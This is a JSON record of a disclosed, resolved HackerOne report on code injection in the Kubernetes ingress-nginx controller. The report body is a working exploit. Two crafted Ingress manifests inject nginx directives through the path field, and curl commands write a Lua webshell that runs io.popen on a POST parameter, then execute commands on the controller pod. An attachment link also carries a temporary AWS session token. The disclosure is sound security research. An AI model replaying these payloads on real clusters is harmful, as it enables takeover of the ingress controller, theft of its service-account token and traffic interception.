{
  "id": 1620702,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjIwNzAy",
  "url": "https://hackerone.com/reports/1620702",
  "title": "RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-06-30T14:34:17.901Z",
  "submitted_at": "2022-06-30T14:34:17.996Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ginoah",
    "url": "/ginoah",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ywir1vpgaes9a9whlbdv8zbcryyt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-10-26T10:07:49.100Z",
  "bug_reporter_agreed_on_going_public_at": "2023-10-26T10:07:48.993Z",
  "team_member_agreed_on_going_public_at": "2023-10-25T21:23:17.540Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\n\nA user with ingress create/update privilege may inject config into `nginx.conf` with `path`.\nConfig the log_format and access_log to write arbitrary file.\nInclude the file we created to bypass `path` sanitizer to RCE.\n\n## Kubernetes Version:\n\n```\nserverVersion:\n  buildDate: \"2022-03-06T21:32:53Z\"\n  compiler: gc\n  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a\n  gitTreeState: clean\n  gitVersion: v1.23.4\n  goVersion: go1.17.7\n  major: \"1\"\n  minor: \"23\"\n  platform: linux/amd64\n```\n\n## Component Version:\n\n```\n-------------------------------------------------------------------------------\nNGINX Ingress controller\n  Release:       v1.2.1\n  Build:         08848d69e0c83992c89da18e70ea708752f21d7a\n  Repository:    https://github.com/kubernetes/ingress-nginx\n  nginx version: nginx/1.19.10\n\n-------------------------------------------------------------------------------\n```\n\n## Steps To Reproduce:\n\n  1. Create a kind cluster config\n\nlab.yaml\n```yaml\nkind: Cluster\nname: lab\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n# the control plane node config\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: InitConfiguration\n    nodeRegistration:\n      kubeletExtraArgs:\n        node-labels: \"ingress-ready=true\"\n  extraPortMappings:\n  - containerPort: 80\n    hostPort: 80\n    protocol: TCP\n  - containerPort: 443\n    hostPort: 443\n    protocol: TCP\n# the three workers\n- role: worker\n- role: worker\n- role: worker\n```\n\n  2. Create a testing cluster with the previous config\n\n```bash\nkind create cluster --config lab.yaml\n```\n\n  3. Install nginx-ingress-controller\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml\n```\n\n  4. Create a the first malicious ingress\n\n**This ingress will allow attacker to write arbitrary content to arbitrary file.**\n(note that the service `not-exist-service` does not need to exist)\n\nwrite_ingress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: webexp\nspec:\n  rules:\n    - host: \"example.com\"\n      http:\n        paths:\n          - path: \"/x/ {\\n\n            }\\n\n          }\\n\n          log_format exploit escape=none $http_x_ginoah;\\n\n          server {\\n\n            server_name x.x;\\n\n            listen 80;\\n\n            listen [::]:80;\\n\n            location /z/ {\\n\n                access_log /tmp/luashell exploit;\\n\n            }\\n\n            location /x/ {\\n\n          #\"\n            pathType: Exact\n            backend:\n              service:\n                name: not-exist-service\n                port:\n                  number: 8080\n```\n\nApply the first malicious ingress config\n```bash\nkubectl apply -f write_ingress.yaml\n```\n\n  5. Write a malicious lua config to `/tmp/luashell`\n\nNote that in other cluster config, the `localhost` may need to change to ingress-controller's ip.\n```bash\ncurl localhost/z/ -H \"host: x.x\" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args[\"cmd\"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read(\"*a\");ngx.say(string.format(\"%s\", ret));end;}'\n```\n\n  6. Create a the second malicious ingress\n\n**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**\n\nwebshell_ingress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: webexp\nspec:\n  rules:\n    - host: \"example.com\"\n      http:\n        paths:\n          - path: \"/x/ {\\n\n            }\\n\n          }\\n\n          log_format exploit escape=none $http_x_ginoah;\\n\n          server {\\n\n            server_name x.x;\\n\n            listen 80;\\n\n            listen [::]:80;\\n\n            location /z/ {\\n\n                include /tmp/luashell;\\n\n            }\\n\n            location /x/ {\\n\n          #\"\n            pathType: Exact\n            backend:\n              service:\n                name: not-exist-service\n                port:\n                  number: 8080\n```\n\nApply the second malicious ingress config\n```bash\nkubectl apply -f webshell_ingress.yaml\n```\n\n  7. RCE and get output\n\n```bash\ncurl localhost/z/ -H \"host: x.x\" -d \"cmd=id\"\n```\n\n## Supporting Material/References:\n\n  * [attachment / reference]\n\n{F1802462}\n\n## Impact\n\nA cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod\n\nAfter RCE on ingress-nginx-controller the attacker may\n- utilize the token to take further action on cluster with ingress's privilege\n- eavesdrop the traffic, modify other ingress rule\n- DOS\n- ...",
  "bounty_amount": "2500.0",
  "formatted_bounty": "$2,500",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1802462,
      "file_name": "Screen_Shot_2022-06-30_at_10.22.52_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/feuyy84f9a9k05e2qq5bd1dxa986?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-30_at_10.22.52_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-30_at_10.22.52_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUX64IZSQ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T195749Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIFiLe1BDc47M%2FGEYt6B6yp2EdygGNJwtzOGSlwqlZQEXAiEAwBQ4Ur3B%2FaFEs0fY8H0mg7G3j3QxyOWOB9PWkHneNs4quwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLry5f62zCqjLY4KMSqPBWu1cy8EIQ6eRljs5bt%2B5LQ3RplYifzmQr%2Br9weTijzbL%2BVWf8wkCkU4V%2FKYJThuHLTDIwM%2BvmYd5r22lKsiQ0Urjws6I08tUkhuwe2HNj0CI14ReJ7Vzkt%2BJ%2FZZOt%2FojgP8QkXycvpUIUnal%2FUyj215f5tjGW0ZHMfhHfVdSxTQe05SuL2EfTdN4EFvxiF6lz8R6Oj58xZdaGfCWus%2BFD4NIlMNErOVgYjnrpdFo3ilJhD1eiBWwSYhDxMyMzzFD1MhNmhPiayhBdEVfPOn7%2BMO4AJPqDkgGuCH7ccnTJJhZajM6CNFNbLdoVONQzx2QHGJl3ANw6xXXwoP8jf%2BMhmKKw6IlEQWGV%2BJZGMsQ9P1sNKCTAaiqJPSeolfNGUBf8Aa22Mex8Y86C24HjuitMz77Ze6eBWSnqQkJXa2R2zbIQ%2FPtJfPqAv7h3sYvVWw0eGoPjnes17RFjEMhYPZcU%2BBzoEKl8Lx96T7K7AiDvO97C00wlp91SE%2FsJKyvgYW7MwDJYLsa9jHXbiWMM8Jm1pPeglj7bQ4luQish0eyzFEXnfwYh357naTHZuFOOVnrH4cHwI1ZBaqIZ%2BhUuP2SjZOpdyVlV5Mbr61e%2BDrrtKOukgqcsMKzNzyKlq8MEWRuCO1igunQ6tGBv9OuQMVzeStOLUpD1TuJIEpFFKgAVlSp5Qgy8GKoawckDO5Qg9n5rl8ppwSGBZtbAQH0wUp%2BQ%2FPqfYyIrpTTM0C4Gi6SvqehOOud3sAv096ZiUWlefEwCQrmnf0jhUSFKcj9jJQE5M9stGL0y%2Fj%2BCAWHQF3zTbaZaxufInypBcZNveuw4GErkZH80Jkzzb7pMn%2BzVF3i%2BXxdvdOXrtAAwUP%2Fz9SNYQwzI%2B7xgY6sQGmEkMHCJR3C8OFnDmWmUD43pKLVnxpv87U8ex2OLLCj5T%2ByGA6JNFRYuMWZDHxwI8ravVA9eNPEnjiULNclow%2Bu5uzfc2EuUk5wcKAO8XJAmw%2F%2FA%2F76mqrDHWUcOtpTFDnN4bkyAOKG43JnDNl4lXH2Uqv9eHF2F82xABB%2BthrE277Z%2BdXgn0dYCqCwxQBWFYPhAW3BMPcszvIuoK7O7U8JwCJeOvASfLHlYiF9S2zaEg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea23f1b93cfbc29fd7ccd0bf5c0d1962f071dc70c3f342e108bffdc9a22e3177",
      "file_size": 327585,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-11-24T21:23:17.816Z",
  "allow_singular_disclosure_after": -57537271.36204219,
  "singular_disclosure_allowed": true,
  "vote_count": 46,
  "voters": [
    "8910jq",
    "x3am",
    "n1m0",
    "todayisnew-",
    "zy9ard3",
    "shreyaschavhan",
    "ronak_9889",
    "neilx",
    "hackduty",
    "eminfidan",
    "and 36 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 32524,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
